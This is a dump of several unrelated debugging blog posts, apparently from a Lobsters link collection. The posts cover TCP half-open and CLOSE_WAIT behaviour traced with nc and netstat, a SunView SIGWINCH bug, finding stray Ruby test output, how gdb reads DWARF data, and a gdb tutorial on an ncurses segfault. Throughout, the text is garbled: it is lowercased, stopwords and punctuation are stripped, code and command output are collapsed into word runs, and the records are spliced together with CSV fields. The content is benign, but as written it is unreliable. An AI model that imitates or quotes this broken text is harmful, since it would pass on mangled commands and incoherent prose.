timewait stack kodos acknowledges fin tcp stack kang receives ack fin remove connection entirely two minute later tcp connection kodos closed stack remove connection entirely possible step slightly reordered kang transition closing instead final state according netstat server root kodos netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state timewait output connection kang intermediate state transition quickly could see using dtrace tcp provider see packet flow using snoop tcpdump conclusion seen normal path system call connection establishment teardown note kang immediately found kodos connection closed woken poll read returned indicate endofstream point kang elected close socket cleaned connection state kodos revisit later see result differ kang nt close socket puzzler power cycling happens established idle tcp connection one system power cycled since process go normal exit part graceful reboot eg use reboot command get basically result type reboot kodos instead killing server ctrlc would happen powercycled kodos previous example surely kang eventually find right let try set connection server root kodos truss bind listen accept poll read write nc l p base time stamp fri may utc bind sovsockbsd listen sovdefault accept sovdefault pollsys sleeping client root kang truss open connect pollsys read write close nc base time stamp fri may utc connect sovdefault pollsys sleeping use vmware reboot function powercycle system important actual power cycle o panic anything cause graceful shut look like first case minute later kang still sitting place client pollsys sleeping tend believe tcp job maintain consistent abstraction namely tcp connection across multiple system surprising discover case abstraction broken like lest think nc issue netstat kodos show connection kang kang show perfectly healthy connection kodos client root kang netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state established leave forever without touching kang never figure kodos rebooted suppose point kang try send data kodos happens let try client pollsys sleeping kodos pollsys read k r e write k r e pollsys read err econnreset close root kang type message hit enter kodos get woken read message stdin sends socket write call completes successfully nc go back poll wait another event eventually find socket read without blocking call read time read fails econnreset mean posix definition read say mean econnreset read attempted socket connection forcibly closed peer illumos read man page provides little context econnreset filedes argument refers connection oriented socket connection forcibly closed peer longer valid io longer performed filedes error nt mean something specific read call went wrong rather socket disconnected socket operation would fail way point happened point nc kang tried send data tcp stack still nt know connection dead kang sent data packet kodos responded rst nt know anything connection kang saw rst tore connection close socket file descriptor file descriptor work subsequent operation fail econnreset nc close fd conclusion hard powercycle different graceful shutdown testing distributed system case need specifically tested ca nt kill process expect test thing situation one side belief tcp connection established side situation never automatically resolved possible manage problem using tcp applicationlevel keepalive reason kang eventually found remote side disappeared took action sent data received response indicating connection gone raise question kodos responded data message reason puzzler power happens one endpoint tcp connection powered endpoint ever discover set connection nc server root kodos truss bind listen accept poll read write nc l p base time stamp fri may utc bind sovsockbsd listen sovdefault accept sovdefault sleeping accept sovdefault pollsys sleeping client root kang truss open connect pollsys read write close nc base time stamp fri may utc connect sovdefault pollsys sleeping cut power kodos abruptly attempt send data kang client pollsys sleeping pollsys read n write n pollsys sleeping write completes normally nt see anything quite minute later see client pollsys sleeping pollsys read err etimedout close look similar case system powercycled instead powered except two thing took minute system notice error reported etimedout note read timed per se would seen error socket operation subsequent socket operation would likely fail immediately etimedout error socket entered state underlying connection timed specific reason remote side failed acknowledge data packet long minute configured system conclusion remote system powered instead power cycled first system find trying send data nt send packet never find terminated connection system attempting send data long enough without receiving acknowledgment remote side tcp connection terminated socket operation fail etimedout puzzler broken connection failure time instead giving specific case asking happens flip around observation see figure could happen discussed several case kang believe connection kodos kodos nt know possible kang connection kodos without kodos knowing indefinitely ie resolve even power power cycle failure operating system kodos failure networking equipment hint consider case connection stuck established case fair say application responsibility deal problem since definition still socket open could find sending data point connection eventually terminated application nt socket open warmup looked case kodos nc closed socket said kang nc read indicating endofstream closed socket nt close socket kept open obviously could nt read nothing tcp say ca nt send data side sent fin fin mean endofdatastream direction fin sent order demonstrate ca nt use nc kang automatically close socket read written demo version nc called dnc simply skip behavior also print explicitly system call making give u chance observe tcp state first set connection usual server root kodos truss bind listen accept poll read write nc l p base time stamp fri may utc bind sovsockbsd listen sovdefault accept sovdefault sleeping accept sovdefault pollsys sleeping client root kang dnc establishing connection connected entering poll let verify connection established state expect side server root kodos netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state established client root kang netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state established let ctrlc nc process kodos server pollsys sleeping c root kodos immediately see kang client poll returned event reading socket read endofstream socket read byte socket entering poll let look tcp connection state server root kodos netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state client root kang netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state closewait make sense kodos sent fin kang indicates kodos received ack kang fin sent closewait indicates kang received fin sent fin back perfectly valid state tcp connection indefinite period time imagine kodos sent request kang planning send request kang could happily send data response hour would work case kodos actually closed socket let wait minute check tcp connection state minute later connection completely missing kodos still present kang client root kang netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state closewait happened hit lesserknown special case tcp stack application closed socket tcp stack sent fin remote tcp stack acknowledged fin local tcp stack wait fixed period time close connection reason case remote side rebooted case actually analog case one side established connection nt know difference specific case application closed socket component could deal problem result tcp stack wait fixed period time tear connection without sending anything side followup question happens kang sends data kodos point remember kang still think connection open torn kodos client entering poll kodos poll returned event reading stdin writing byte read stdin socket entering poll poll returned event reading socket dnc read connection reset peer saw case puzzler write actually succeeds since tcp stack nt know connection closed yet get rst wake thread poll subsequent read return econnreset conclusion possible two side disagree state connection even o network hardware failure case like one possible kang distinguish case kodos attentively waiting receive data kodos closed socket nt listening least without sending packet reason maybe great idea design system us socket halfopen state extended period time normal operation conclusion tcp typically presented protocol maintaining consistent abstraction tcp connection across two system know face certain type network software problem connection fail always obvious case abstraction fails two system disagree state connection specifically possible one system think working established tcp connection remote system remote system know nothing connection possible even failure network hardware operating system behavior reflect deficiency tcp quite contrary case tcp implementation appears behave reasonably could given situation tempted implement communication mechanism instead using tcp presence case might well remind u complex underlying problem intrinsic problem distributed system tcp connection fundamentally distributed system said single important lesson notion tcp connection span multiple system convenient fiction go wrong critical think two separate state machine operate simultaneously try maintain consistent view connection responsibility application handle case differ often using keepalive mechanism furthermore disconnect application file descriptor underlying tcp connection tcp connection exist various state related closing even application closed file descriptor file descriptor open underlying tcp connection closed result failure lesson keep mind ungraceful reboot system happens o crash userland process exiting closing socket important test case specifically reboot remote system come back online connection time also different poweroff proactive notification kernel tcp socket torn find call read write socket operation socket file descriptor program nt reason never find connection failure related note found nt commonly known econnreset socket error see read write operation indicates remote peer sent rst etimedout socket error see read write operation indicates timeout associated connection elapsed case seen remote side acknowledge packet long usually either data packet fin packet keepalive probe importantly neither error mean anything wrong read write operation tried socket closed made far sort problem sound interesting hiring
549,Lobsters,debugging,Debugging,My first professional bug,https://borkwarellc.wordpress.com/2011/04/03/my-first-professional-bug/,first professional bug,friday q signal,mike ash recent friday q signal mentioned sigwinch hearing always sends memory lane first professional bug centered around sigwinch professional bug mean bug someone paid actual money fix period employment went work company called visix straight college early time sold product called looking glass file browser much like macintosh finder unix eventually looking glass would become caldera linux desktop looking glass supported major graphical windowing system time intergraph environ v sun sunview image top posting screen shot could find version looking glass worked running sunview notice awesome desktop widget top typical sunview style looking glass pure awesome eye candy comparison hired tech support team duty phone support typically debugging network configuration x server font path porting looking glass platform lo mein totem pole got given old platform nobody wanted touch sunview sunos come looking glass would hang randomly worked fine job find fix hang first introduction lot thing c unix system windowing system navigating large code base conditional compilation debugger vendor documentation apple working company luckily sunview version sell terribly well everyone moving couple customer bitten problem sunview sunview windowing system different program run displaying graphical output window nowadays commonplace back sunview came pretty cool sunview one earlier windowing system bunch peculiarity biggest window screen represented honesttogod kernel device window would finite number window device system ran window open definite assumption one window one process sunview window playground looking glass different could open multiple window finite number window available systemwide create alert said open window window launch time thereby consuming precious window resource hide offscreen way could reliably tell user open window glad one make work first place fixing legacy code peculiarity never got window event even version macintosh toolbox could easily figure user dragged window resized changed stacking order sunview got signal sigwinch window change hence memorylane trigger user moved window sigwinch user resized sigwinch user changed zorder sigwinch one window bad query window current size u though cache every window location size stacking order upon receipt sigwinch would walk window compare new value cached version something interesting changed would need work laying window content back bug took solid month fix time thought failure worried get fired would embarrassing took long fix part time work amongst responsibility also difficult reproduce spastic clicking dragging could make lock reliably using debugger pointless meg sun swapped two hour dbx tried load looking glass ended using lot caveman debugging application event architecture used shown right window event queue remember one window one process assumption held mouse keyboard event upon receipt new event forget got signal file descriptor became readable would walk window read event handle move next window getting printout though showing window receiving mousedowns mousedrags mouseup occasionally would see mouseup mousedowns ahha mouseup delivered wrong window event queue probably due race condition system notice current window changed drag fix easy found merge event window first process happiness light learned expensive malloc malloc free event structure performance dogslow especially mouse drag caching structure made life fast memory like make happy cool tech get play day
550,Lobsters,debugging,Debugging,This is strictly a violation of the TCP specification,http://blog.cloudflare.com/this-is-strictly-a-violation-of-the-tcp-specification/,strictly violation tcp specification,cc image error cloudflare loopback congestion cc image loopback work magically maybe listening application misbehaved sysctl show backlog accept queue size problem closewait anyway cc image red hat doc dequeue socket accept queue really happens reproduce buggy code available recommended read select source ip manually final word manpage open position,asked debug another weird issue network apparently every connection going cloudflare would time http error cc image chris combe error cloudflare indicates connection issue edge server origin server often blame origin server side origin server slow offline encountering high packet loss le often problem side case debugging neither internet connectivity cloudflare origin perfect packet loss flat latency see error root cause issue pretty complex lot debugging identified important symptom sometimes thousand run test program failed establish connection two daemon machine precise nginx instance trying establish tcp connection internal acceleration service localhost failed timeout error knew look able reproduce good old netcat couple dozen run saw nc v nc connect port tcp failed connection timed view strace socket pfinet sockstream ipprototcp connect safamilyafinet sinporthtons sinaddrinetaddr etimedout netcat call connect establish connection localhost take long time eventually fails etimedout error tcpdump confirms connect send syn packet loopback never received synacks sudo tcpdump ni lo port ttttt ip flag seq win option ms sackok t val ecr nop wscale length ip flag seq win option ms sackok t val ecr nop wscale length hold happened well called connect localhost timed syn packet went loopback localhost never answered loopback congestion cc image first thought internet stability maybe syn packet lost little known fact possible packet loss congestion loopback interface loopback work magically application sends packet immediately still within send syscall handling get delivered appropriate target buffering loopback calling send loopback trigger iptables network stack delivery mechanism delivers packet appropriate queue target application assuming target application space buffer packet loss loopback possible maybe listening application misbehaved normal circumstance connection localhost supposed time one corner case may happen though listening application call accept fast enough happens default behavior drop new syn packet listening socket full accept queue new syn packet dropped intention cause pushback slow rate incoming connection peer eventually resend syn packet hopefully time accept queue freed behavior controlled tcpabortonoverflow sysctl accept queue overflow happen case listening application empty accept queue checked s command s sport state recvq sendq local address port peer address port listen sendq column show backlog accept queue size given listen syscall case recvq report number outstanding connection accept queue zero problem recap establishing connection localhost work fine sometimes connect syscall time syn packet sent loopback loopback delivered listening socket listening socket accept queue empty see synacks investigation revealed something peculiar noticed hundred closewait socket s head state recvq sendq local address port peer address port closewait closewait closewait closewait closewait closewait anyway cc image davebleasdale citing red hat doc closewait indicates server received first fin signal client connection process closed mean socket waiting application execute close socket closewait state indefinitely application close faulty scenario would like file descriptor leak server executing close socket leading pile closewait socket make sense indeed able confirm listening application leak socket hurray good progress leaking socket nt explain everything though usually linux process open file descriptor application run file descriptor accept syscall would return emfile error application mishandled error case could result losing incoming syn packet failed accept call dequeue socket accept queue causing accept queue grow accept queue drained eventually overflow overflowing accept queue could result dropped syn packet failing connection attempt happened application nt run file descriptor yet verified counting file descriptor proc pid fd directory l proc pidof listener fd wc l file descriptor comfortably far file descriptor limit also earlier showed s accept queue empty connection time really happens root cause problem definitely application leaking socket symptom though connection timing still unexplained time raise curtain doubt happens listening application leak socket stuck closewait tcp state forever socket look like someport client socket end connection someport properly closed cleaned client application quits someport socket enters state quickly transition state move timewait client received fin packet never happens eventually time linux second controlled sysctl problem start someport socket still closewait state someport cleaned ready reused happens result total mess one part socket wo nt able advance synsent state part stuck closewait synsent socket eventually give failing etimedout reproduce start listening application leak socket forgets call close kind bug happen complex application example buggy code available run nothing happen initially s show usual listening socket go build listenergo listener s sport state recvq sendq local address port peer address port listen user listener client application client behaves correctly establishes connection close demonstrate nc nc localhost s dport sport state recvq sendq local address port peer address port estab user listener estab user nc see s show two tcp socket representing two end tcp connection client one server one next step gracefully close client connection kill pidof nc connection enter tcp cleanup stage client connection closewait server one want read tcp state recommended read s state recvq sendq local address port peer address port closewait user listener expire s state recvq sendq local address port peer address port closewait user listener closewait socket stay since leaked file descriptor listener program kernel allowed move finwait state stuck closewait indefinitely stray closewait would problem port pair never reused unfortunately happens cause problem see need launch hundred nc instance hope kernel assign colliding port number one affected nc stuck connect nc v localhost use s confirm port indeed collide synsent user nc closewait user listener example kernel allocated source address nc process tcp flow okay used connection going listener application listener able allocate flow reverse direction since previous connection still used remains closewait state kernel get confused retries syn packet never respond since tcp socket stick closewait state eventually affected netcat die unhappy etimedout error message nc connect localhost port tcp failed connection timed want reproduce weird scenario consider running script greatly increase probability netcat hitting conflicted socket seq nc v localhost done little known fact source port automatically assigned kernel incremental unless select source ip manually case source port random bash script create minefield closewait socket randomly distributed across ephemeral port range final word moral story watch closewait socket presence indicate leaking socket leaking socket incoming connection may time presence many socket say problem current machine remote end connection furthermore bug show possible state two end tcp connection odds even connection loopback interface seems design decision made bsd socket api unexpected long lasting consequence think exactly socket automatically expire finwait state ca nt move closewait grace time confusing original tcp specification allow automatic state transition state according spec supposed stay running application side clean let leave tcp manpage describing tcpfintimeout setting tcpfintimeout integer default specifies many second wait final fin packet socket forcibly closed strictly violation tcp specification required prevent denialofservice attack think understand automatically closing strictly speaking violation tcp specification enjoy playing low level networking bit interested dealing largest ddos attack ever seen definitely look open position london san francisco singapore champaign il austin tx office
551,Lobsters,debugging,Debugging,The Search For <Class:0x00000027b59290>,https://chrisarcand.com//the-search-for-class0x0000001ab51700/,search,manageiq friend mine dtrace joe haml actionview rail til default root ruby object method called print current object screen context anonymous object actionview testing dare ruin pretty green dot joe rafaniello,past many month manageiq little phantom test output one time saw appear whipped safari camera snapped photo wild creature whenever phantom output appears test output brain tell meh schweet whatever brain scream dare ruin pretty green dot spend minute try find every success joked thinking find someday programmatically finding something writes output stream screen easy difficult tried following stdoutsingletonclasssend aliasmethod owrite write stdoutblacklist phantom misc pattern wanted find may cause serious unrecognized argument port already transaction progress class io prepend modulenew def write args stdoutblacklisteach pattern argsfirst pattern stdoutowrite nnfound one stdoutowrite callstack n callereach line stdoutowrite line n end stdoutowrite n stdoutflush end end super end end rather hacky code thing first alias write method singleton class stdout global variable ruby representing current standard output io object prepends custom io write overriding original method hierarchy allow u look thing written something send original standard output method call original write hierarchy note prepend affect io class entirely meaning every io object including one write file database etc affected unless know signing saying friend mine put showed feel like io hardly used computering p decided rspec interesting redirection output lazy track instance code work correctly found blacklisted pattern assigned gem outputting warning message tell u whatever calling thing outputting screen called within ruby instead c level native ruby solution know find already transaction progress obvious message native postgresql found either continue hunt dig deeper tool dtrace familiar tool would love dig fully day spending effort find random test output offender exactly worth time meh schweet whatever fast forward yesterday joe pairing tedious change codebase constantly starting long running test suite decided go phantom cheated little bit mind knew seeing often type test output coming within short time found offending test view spec using documentation formatter rspec little put debugging narrowed call render follows short read took time truly understand care admit digging view rendered found offending line view haml checkboxtag display true recorddisplay disabled true mmmk call actionview rail let look something awful override method somewhere app nope display coming anyway see reference code whatsoever happens call display moment time huh print offending message screen return nil really display coming throw error defined ah ha expected caller c level thought sourcelocation return ruby source filename line number containing method nil method defined ruby ie native well hell could display coming output obviously printing current object oh til object default root ruby object method called display print current object screen context anonymous object actionview testing fun irb something tell intended value id attribute particular check box later found code copied somewhere else defines display variable display recordsetdatakey display recordsetdata display true checkboxtag display true display disabled true case string display called display instead sheer coincidence word display ruby object valid caller dare ruin pretty green dot thanks joe rafaniello joining fun little hunt
552,Lobsters,debugging,Debugging,How does gdb work?,http://jvns.ca/blog/2016/08/10/how-does-gdb-work/,gdb work,ruby stacktrace project getting global variable symbol table dereferencing pointer dereference describing structs dwarf confusing answer unwinding stacktraces thing gdb gdb example yesterday,hello today working bit ruby stacktrace project realized know couple thing gdb work internally lately using gdb look ruby program going running gdb ruby program really mean ruby interpreter first going print address global variable rubycurrentthread getting global variable get address global rubycurrentthread sudo gdb p gdb p rubycurrentthread rbthreadt rubycurrentthread place variable live heap stack program text global variable part program think allocated compile time kind turn figure address global variable pretty easily let see gdb came find approximate region variable life looking cool file proc called proc pidmaps sudo cat grep binruby rxp r p rwp starting address like different different well get subtract gdb px number might ask well let look symbol table program nm sudo nm grep rubycurrentthread b rubycurrentthread see could yes want find address global variable program need look name variable symbol table add start range procwhatevermaps done know gdb gdb much let skip ahead dereferencing pointer gdb p rubycurrentthread rbthreadt next thing going dereference rubycurrentthread pointer want see address gdb run bunch system call like ptrace ptracepeektext remember address gdb asking hey address exactly pid process running gdb using ptrace system call gdb everything awesome dereference memory figure byte memory address useful gdb command know variable variable display word byte given address respectively describing structs memory address look like bunch byte gdb rubycurrentthread useful useful human like want know mean need like gdb p rubycurrentthread self vm stack stacksize cfp safelevel raisedflag laststatus state waitingfd passedblock passedbmethodme passedci topself topwrapper baseblock rootlep rootsvar threadid goodness lot useful gdb know cool field like stacksize enter dwarf dwarf way store extra debugging data program debugger like gdb job better generally stored part binary run dwarfdump ruby binary get output like redacted heavily make easier understand dwatname rbthreadstruct dwatbytesize dwtagmember dwatname self dwattype dwatdatamemberlocation dwopplusuconst dwtagmember dwatname vm dwattype dwatdatamemberlocation dwopplusuconst dwtagmember dwatname stack dwattype dwatdatamemberlocation dwopplusuconst dwtagmember dwatname stacksize dwattype dwatdatamemberlocation dwopplusuconst dwtagmember dwatname cfp dwattype dwatdatamemberlocation dwopplusuconst dwtagmember dwatname safelevel dwattype name type rubycurrentthread rbthreadstruct size byte bunch member item stacksize one offset type worry look dwarf info dwtagtypedef dwatname sizet dwattype dwtagbasetype dwatbytesize dwatencoding dwateunsigned dwatname long unsigned int stacksize type sizet mean long unsigned int byte mean read stack size would break dwarf debugging data read region memory rubycurrentthread pointing add byte get stacksize read byte littleendian format since get answer case kb make lot obvious debugging info extra metadata variable meant would idea byte address meant also install debug info program separately program gdb care get extra debug info dwarf confusing reading bunch dwarf info recently right using libdwarf best experience api confusing initialize everything weird way really slow take second read debugging data ruby program seems ridiculous told libdw elfutils better also casually remarked look dwatdatamemberlocation get offset struct member looked stack overflow actually got answer basically start check like dwarfwhatform attrs form error form form form form form form dwformudata keep going million different dwformdata thing need check happening idea anyway impression dwarf large complicated standard possibly library people use generate dwarf subtly incompatible work think really cool write code read dwarf code actually mostly work except crash working unwinding stacktraces earlier version post said gdb unwinds stacktraces using libunwind turn true someone worked gdb lot emailed say actually spent ton time figuring unwind stacktraces better job libunwind mean get stopped middle weird program le debug info might hope done something strange stack gdb try figure anyway thanks thing gdb thing described reading memory understanding dwarf show structs everything gdb looking brendan gregg gdb example yesterday see gdb also know disassemble assembly show content register term manipulating program set breakpoints step program modify memory danger knowing gdb work make feel lot confident using used get really confused gdb kind act like c repl sometimes type rubycurrentthread cfp iseq feel like writing c code really writing c easy run limitation gdb understand knowing using dwarf figure content structs give better mental model correct expectation awesome
553,Lobsters,debugging,Debugging,gdb Debugging Full Example (Tutorial): ncurses,http://www.brendangregg.com/blog/2016-08-09/gdb-example-ncurses.html,gdb debugging full example tutorial ncurses,give minute change view gdb problem bcc cachetop fixing core dump kerneltxt starting gdb back trace disassembly check register memory mapping breakpoints stepping reverse stepping debug info source code tui external cscope external perftoolsftraceuprobes perftools external bccbpf bcc ubuntu xenial breakpoints external cscope take became writing memory conditional breakpoints return better workaround github python context final word,little frustrated finding gdb example online show command output gdb gnu debugger standard debugger linux reminded lack example output watching give minute change view gdb talk greg law cppcon thankfully includes output well worth minute also inspired share full gdb debugging example output every step involved including dead end nt particularly interesting exotic issue routine gdb debugging session cover basic could serve tutorial sort bearing mind lot gdb used running following command root since debugging tool need root access substitute nonroot sudo desired also nt expected read enumerated step browse find one interest problem bcc collection bpf tool pull request cachetop us toplike display show page cache statistic process great however tested hit segfault cachetoppy segmentation fault note say segmentation fault segmentation fault core dumped like core dump debug core dump copy process memory name coming era magnetic core memory investigated using debugger core dump analysis one approach debugging one could run program live gdb inspect issue could also use external tracer grab data stack trace segfault event start core dump fixing core dump check core dump setting ulimit c cat procsyskernelcorepattern core ulimit c show maximum size core dump created set zero disabling core dump process child proc corepattern set core drop core dump file called core current directory ok show set global location ulimit c unlimited mkdir varcores echo varcorescore e p procsyskernelcorepattern customize corepattern eg h hostname time dump option documented linux kernel source documentationsysctlkerneltxt make corepattern permanent survive reboots set via kernelcorepattern etcsysctlconf trying cachetoppy segmentation fault core dumped l lh varcores total rw root root aug file elf lsb core file version sysv python cachetoppy better core dump starting gdb run gdb target program location using shell substitution although specify full path unless sure work core dump file gdb python gnu gdb ubuntu copyright c free software foundation inc license gnu gpl version later free software free change redistribute warranty extent permitted law type show copying show warranty detail gdb configured type show configuration configuration detail bug reporting instruction please see find gdb manual documentation resource online help type help type apropos word search command related word reading symbol usrbinpython debugging symbol found done warning core file may match specified executable file new lwp thread debugging using libthreaddb enabled using host libthreaddb library warning jited object file architecture unknown compatible target architecture core generated python cachetoppy program terminated signal sigsegv segmentation fault doupdate last two line especially interesting tell u segmentation fault doupdate function libncursesw library worth quick web search case wellknown issue took quick look nt find single common cause already guess libncursesw foreign lib ending show shared library might man page website package description etc dpkg l grep libncursesw ii shared library terminal handling wide character support happen debugging ubuntu linux distro nt matter gdb usage back trace stack back trace show arrived point fail often enough help identify common problem usually first command use gdb session bt short backtrace gdb bt doupdate wrefresh wgetch pyevalevalframeex pyevalevalcodeex pyobjectcall pyevalevalframeex pyevalevalcodeex pyevalevalframeex pyevalevalcodeex pyevalevalcode pyrunfileexflags pyrunsimplefileexflags pymain libcstartmain main init optimized fini optimized rtldfini optimized start read bottom go parent child entry symbol translation failed stack walking produce stack trace also fail case likely see single valid frame small number bogus address symbol stack badly broken make sense stack trace usually way fix installing debug info package giving gdb symbol letting dwarfbased stack walk recompiling software source frame pointer debugging information fnoomitframepointer g many entry fixed adding pythondbg package particular stack nt look helpful frame indexed left python internals although ca nt see python method yet frame curse library libncursesw look like wgetch wrefresh doupdate based name guess window refresh would core dump disassembly start disassembling function segfaulted doupdate gdb disa doupdate dump assembler code function doupdate push push push push push rbp push rbx sub rsp type return continue q return quit cmpb rcx je mov rip rax mov rax rsi xor eax eax mov rsi rdi cmpb rdi jne movswl rcx ecx movswl rdx edi mov rsp output truncated could also typed disa would defaulted doupdate arrow pointing segfault address mov rsi rdi move memory pointed rsi register plus offset rdi register check state register next check register printing register state using r short info register gdb r rax rbx rcx rdx rsi rdi rbp sp rsp rip eflags pf zf rf c s d e f g well rsi zero problem zero unlikely valid address type segfault common software bug dereferencing uninitialized null pointer memory mapping double check zero valid using proc short info proc mapping gdb proc mapped address space start addr end addr size offset objfile first valid virtual address anything invalid referenced trigger segmentation fault point several different way dig start instruction stepping breakpoints back disassembly mov rip rax mov rax rsi xor eax eax mov rsi rdi reading four instruction look like pulling something stack rax dereferencing rax rsi setting eax zero xor optimization instead mov dereference rsi offset although know rsi zero sequence walking data structure maybe rax would interesting set zero prior instruction ca nt see core dump register state set breakpoint singlestep instruction see register set change first need launch gdb executing program live gdb python gnu gdb ubuntu copyright c free software foundation inc license gnu gpl version later free software free change redistribute warranty extent permitted law type show copying show warranty detail gdb configured type show configuration configuration detail bug reporting instruction please see find gdb manual documentation resource online help type help type apropos word search command related word reading symbol usrbinpython debugging symbol found done set breakpoint using b short break gdb b doupdate symbol table loaded use file command oops wanted show error explain often start breakpoint main point symbol likely loaded setting real breakpoint interest go straight doupdate function entry run problem set offset breakpoint hit function gdb b doupdate function doupdate defined make breakpoint pending future shared library load n breakpoint doupdate pending gdb r cachetoppy starting program usrbinpython cachetoppy thread debugging using libthreaddb enabled using host libthreaddb library warning jited object file architecture unknown compatible target architecture breakpoint doupdate gdb b doupdate breakpoint gdb c continuing breakpoint doupdate arrived breakpoint nt done r run command take argument passed gdb target specified earlier command line python end running python cachetoppy stepping step one instruction si short stepi inspect register gdb si doupdate gdb r rax rbx rcx rdx rsi rdi rbp sp rsp rip eflags c s d e f g gdb pa curterm another clue null pointer dereferencing look like symbol called curterm pa short printa mean format address given ncurses term environment set something odd echo term tried setting running program hit segfault note inspected first invocation doupdate could called multiple time issue may later invocation step running c short continue ok called time called thousand time want different approach get back section reverse stepping gdb great feature called reverse stepping greg law included talk example start python session show beginning gdb python gnu gdb ubuntu copyright c free software foundation inc license gnu gpl version later free software free change redistribute warranty extent permitted law type show copying show warranty detail gdb configured type show configuration configuration detail bug reporting instruction please see http wwwgnuorgsoftwaregdbbugs find gdb manual documentation resource online http wwwgnuorgsoftwaregdbdocumentation help type help type apropos word search command related word reading symbol usrbinpython debugging symbol found done set breakpoint doupdate hit enable recording continue program let crash recording add considerable overhead nt want add main gdb b doupdate function doupdate defined make breakpoint pending future shared library load n breakpoint doupdate pending gdb r cachetoppy starting program usrbinpython cachetoppy thread debugging using libthreaddb enabled using host libthreaddb library warning jited object file architecture unknown compatible target architecture breakpoint doupdate gdb record gdb c continuing program received signal sigsegv segmentation fault doupdate point reversestep line instruction work playing back register state recording move back time two instruction print register gdb reversestepi doupdate gdb reversestepi doupdate gdb r rax rbx rcx rdx rsi rdi rbp sp rsp rip eflags c s d e f g gdb pa curterm back finding curterm clue really want read source code point start debug info debug info libncursesw nt debug info installed ubuntu aptcache search libncursesw shared library terminal handling wide character support debuggingprofiling library ncursesw developer library ncursesw dpkg l grep libncursesw ii shared library terminal handling wide character support add aptget install reading package list done building dependency tree reading state information done operation kb additional disk space used http xenialmain kb fetched kb kb selecting previously unselected package reading database file directory currently installed preparing unpack unpacking setting dpkg l grep libncursesw ii shared library terminal handling wide character support ii debuggingprofiling library ncursesw good version match segfault look gdb python gnu gdb ubuntu warning jited object file architecture unknown compatible target architecture core generated python cachetoppy program terminated signal sigsegv segmentation fault clrblank backcolorerase gdb bt clrblank clrupdate doupdate wrefresh winwin recurwrefresh winwin ncwgetch winwin resultresult wgetch pyevalevalframeex pyevalevalcodeex pyobjectcall pyevalevalframeex pyevalevalcodeex pyevalevalframeex pyevalevalcodeex pyevalevalcode pyrunfileexflags pyrunsimplefileexflags pymain libcstartmain main init optimized fini optimized rtldfini optimized start stack trace look bit different nt really doupdate clrblank inlined clrupdate inlined doupdate really want see source source code debug info package installed gdb list source along assembly gdb disa dump assembler code function doupdate push push push push jne curscreen spparm clear newscreen spparm clear force refresh mov rdx rax mov rdx rcx cmpb rax jne cmpb rcx je backcolorerase mov rip rax mov rax rsi ncursescht blank blankchar xor eax eax backcolorerase mov rsi rdi cmpb rdi jne great see arrow line code segfaulting backcolorerase nt seem possible segfault would due memory dereference c would b case backcolorerase look like accessing ordinary variable dereferencing memory point double checked right debug info version reran application segfault live gdb session place something special backcolorerase clrblank list source code gdb list clrblank static ncursesinline ncursescht clrblank ncursesspdclx window win ncursescht blank blankchar backcolorerase addattr blank attrof bcebkgd spparm win bceattrs return blank ah defined function global tui worth showing look gdb text user interface tui nt used much inspired seeing greg talk launch using tui gdb tui python source available none process l pc gnu gdb ubuntu copyright c free software foundation inc license gnu gpl version later free software free change redistribute warranty extent permitted law type show copying show warranty detail gdb configured type continue q quit complaining python source could fix crashing libncursesw hitting enter let finish loading point load libncursesw debug info source code static ncursesinline ncursescht clrblank ncursesspdclx window win ncursescht blank blankchar backcolorerase addattr blank attrof bcebkgd spparm win bceattrs return blank clrupdate multithre thread doupdate pc warning jited object file architecture unknown compatible target ar chitecture type return continue q return quit core generated python cachetoppy program terminated signal sigsegv segmentation fault clrblank gdb awesome arrow show line code crashed get even better layout split command follow source disassembly separate window backcolorerase addattr blank attrof bcebkgd spparm win bceattrs return blank clrupdate mov rsi rdi cmpb rdi jne movswl rcx ecx movswl rdx edi mov rsp movl rsp movl rsp multithre thread doupdate pc chitecture core generated python cachetoppy program terminated signal sigsegv segmentation fault type return continue q return quit clrblank gdb layout split greg demonstrated reverse stepping imagine following code assembly execution time need video demonstrate external cscope still want learn backcolorerase could try gdb search command found quicker using external tool cscope cscope textbased source code browser bell lab modern ide prefer use instead setting cscope aptget install cscope wget http tar xvf cd cscope bqr cscope dq cscope bqr build lookup database cscope dq launch cscope searching backcolorerase definition cscope version press key help find c symbol find global definition backcolorerase find function called function find function calling function find text string change text string find egrep pattern find file find file including file find assignment symbol hitting enter define nondestscrollregion cur booleans define canchange cur booleans define backcolorerase cur booleans define huelightnesssaturation cur booleans define coladdrglitch cur booleans define crcancelsmicromode cur booleans oh define could least capitalized common style define ok cur looking definition cscope breeze define cur curterm type least define capitalized found curterm earlier stepping instruction examining register extern ncursesexportvar terminal curterm elif ncurseswrappedvar terminal curterm define curterm ncursespublicvar curterm else extern ncursesexportvar terminal curterm endif cscope read usrincludetermh macro highlight bold line code think taking effect elif nt know need read source sometimes programmer use around debug code want disable production however look autogenerated searching ncursesexportvar find define ncursesexportvar type ncursesimpexp type ncursesimpexp take care noncygwin platform defined ncursesimpexp define ncursesimpexp nothing endif defined ncursesapi define ncursesapi nothing endif defined ncursesexport define ncursesexport type ncursesimpexp type ncursesapi endif defined ncursesexportvar define ncursesexportvar type ncursesimpexp type endif terminal typedef struct term describe actual terminal termtype type terminal type description short filedes file description written tty ottyb original state terminal nttyb current state terminal int baudrate used compute padding char termname used termname terminal gah terminal capitalized along macro code easy follow ok actually set curterm remember problem set zero maybe uninitialized explicitly set browsing code path set might provide clue help answer nt set set zero using first option cscope find c symbol curterm find global definition find function called function find function calling function browsing entry quickly find ncursesexport terminal ncursesspname setcurterm ncursesspdclx terminal termp terminal oldterm tcalled setcurterm p void termp nclockglobal curse oldterm curterm spparm spparm term termp usereentrant curterm termp else curterm termp endif added highlighting even function name wrapped macro least found curterm set via setcurterm maybe nt called external perftoolsftraceuprobes cover using gdb moment ca nt help trying uprobe tool perftools collection us linux ftrace uprobes one advantage using tracer nt pause target process like gdb although nt matter cachetoppy example another advantage trace event thousand easily able trace call setcurterm libncursesw even print first argument appsperftoolsbinuprobe p setcurterm di error missing symbol setcurterm well nt work setcurterm lot way find like gdb objdump gdb info symbol setcurterm setcurterm section text objdump tt grep curterm und curterm objdump tt grep curterm g bs curterm gdb work better plus took closer look source would noticed building libtinfo trying trace setcurterm libtinfo 